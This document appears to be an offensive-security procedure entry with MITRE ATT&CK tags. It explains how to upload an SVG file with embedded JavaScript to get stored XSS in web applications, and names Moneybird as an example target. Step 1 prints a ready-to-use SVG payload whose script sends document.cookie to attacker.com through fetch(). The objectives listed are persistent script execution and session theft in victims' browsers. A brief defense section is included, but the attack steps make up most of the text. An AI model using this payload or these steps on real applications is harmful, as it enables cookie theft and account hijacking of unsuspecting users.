---
tags:
  - xss
  - stored-xss
  - svg-upload
  - file-upload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:37.389Z'
sub_techniques: []
id: d33e5cf0-ed3d-41d8-b7c5-03c99955f862
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Upload-Malicious-SVG-with-Embedded-XSS-Payload

## Summary

This procedure involves crafting and uploading an SVG file containing embedded JavaScript to exploit a stored XSS vulnerability in web applications that fail to sanitize SVG content during upload.

## Description

In applications like Moneybird, the SVG upload feature allows files to be stored and later rendered directly in the browser without validation, enabling attackers to inject malicious scripts. The payload executes when any authenticated user views the file, potentially leading to session theft or further client-side attacks. Prerequisites include authenticated access to the upload endpoint.

## Requirements

1. Authenticated session in the target web application
2. Access to a file upload interface supporting SVG files
3. Text editor to create the malicious SVG
4. Attacker-controlled domain for payload exfiltration

## Defense

Defensive measures and detection strategies:

- Sanitize or block SVG and HTML uploads entirely
- Use Content Security Policy (CSP) to restrict script execution
- Validate file content for script tags before storage
- Monitor for anomalous uploads or JavaScript in file metadata

## Objectives

1. Store a persistent XSS payload on the server
2. Prepare for execution when the file is rendered
3. Enable arbitrary code execution in victim browsers

## Instructions

### Step 1: Craft Malicious SVG Payload

**Context**: Create an SVG file with an onload event that executes JavaScript, such as alerting or exfiltrating cookies.

No specific command; use a text editor to write:

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert('XSS'); fetch('http://attacker.com/steal?data=' + document.cookie);</script>
</svg>
```

Save as `xss.svg`.

> This embeds the script directly; modern browsers may block inline scripts, so use onload attribute for reliability.

### Step 2: Upload the File

**Context**: Submit the SVG through the web application's upload form to store it server-side.

Navigate to the upload interface (e.g., attachments in Moneybird) and select the file.

No command; perform via browser form submission.

> Upon success, the file is stored and can be accessed via a URL like `/files/xss.svg`.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- stored-xss
- svg-upload
